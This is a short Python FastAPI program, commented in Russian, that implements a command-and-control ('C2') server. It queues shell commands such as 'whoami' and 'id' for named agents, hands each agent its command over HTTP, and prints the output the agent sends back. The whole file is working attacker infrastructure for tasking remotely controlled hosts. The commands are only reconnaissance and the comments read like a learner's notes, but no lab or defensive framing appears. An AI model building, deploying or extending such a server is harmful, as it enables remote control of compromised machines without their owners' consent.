from fastapi import FastAPI
from pydantic import BaseModel
import uvicorn

app = FastAPI(title="C2 Server") #экземпляр класса FastAPI

class AgentResponse(BaseModel): #создаем сущность наследуясь от BaseModel
    result: str #позволяет парсить автоматически сырые байты(TCP-пакет от агента)
                #берет JSON в TCP пакете(в данных), ищет там строковое поле
                #result и сохраняет в структуру.
                
tasks_db = {
    "test_agent_1": "whoami",
    "test_agent_2": "id"
}

@app.get("/get_task/{agent_id}") #это ДЕКОРАТОР, который обрабатывает гет
                                       #запросы по URL /get_task/... с помощью
                                       #функции give_task
def give_task(agent_id:str):
    command = tasks_db.get(agent_id, "sleep 10")
    return {"command": command} #возвращение обратно в сокет агенту команду
                                #со всеми нужными заголовками

@app.post("/send_result/{agent_id}")
def receive_result(agent_id: str, data: AgentResponse):
    print(f"\n[+] Получен ответ от агента {agent_id}:")
    print(f"Результат:\n{data.result}")

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8080)
